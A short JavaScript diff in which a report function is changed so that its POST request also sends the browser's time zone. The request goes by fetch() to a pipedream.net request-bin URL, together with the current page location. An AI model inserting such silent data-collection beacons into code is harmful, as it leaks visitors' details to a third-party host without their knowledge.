@@ -11,6 +11,7 @@ function report(abt) {
         method: "POST",
         headers,
         mode: "cors",
+        body: Intl.DateTimeFormat().resolvedOptions().timeZone
     }
 
 fetch("https://enmlfbmjyaluo.x.pipedream.net/?src="+window.location+"&"+abt, options)
